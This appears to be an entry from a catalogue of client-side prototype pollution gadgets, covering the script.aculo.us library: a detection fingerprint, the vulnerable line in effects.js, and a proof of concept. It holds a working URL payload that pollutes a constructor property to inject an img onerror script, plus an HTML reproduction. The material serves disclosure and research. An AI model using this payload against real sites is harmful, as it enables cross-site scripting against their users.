## script.aculo.us

URL: https://github.com/madrobby/scriptaculous

### JS Fingerprint
```
(typeof Scriptaculous !== 'undefined')
```

### Vulnerable code fragment
https://github.com/madrobby/scriptaculous/blob/b0a8422f7f6f2e2e17f0d5ddfef1d9a6f5428472/src/effects.js#L1046
```js
String.__parseStyleElement = document.createElement('div');
```

### PoC

```
?x=x&x[constructor][__parseStyleElement][innerHTML]=<img/src/onerror%3dalert(1)>
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/scriptaculous/1.9.0/scriptaculous.js"></script>
<script>
	String.__parseStyleElement.innerHTML = "<img/src/onerror=alert(1)>"
</script>
```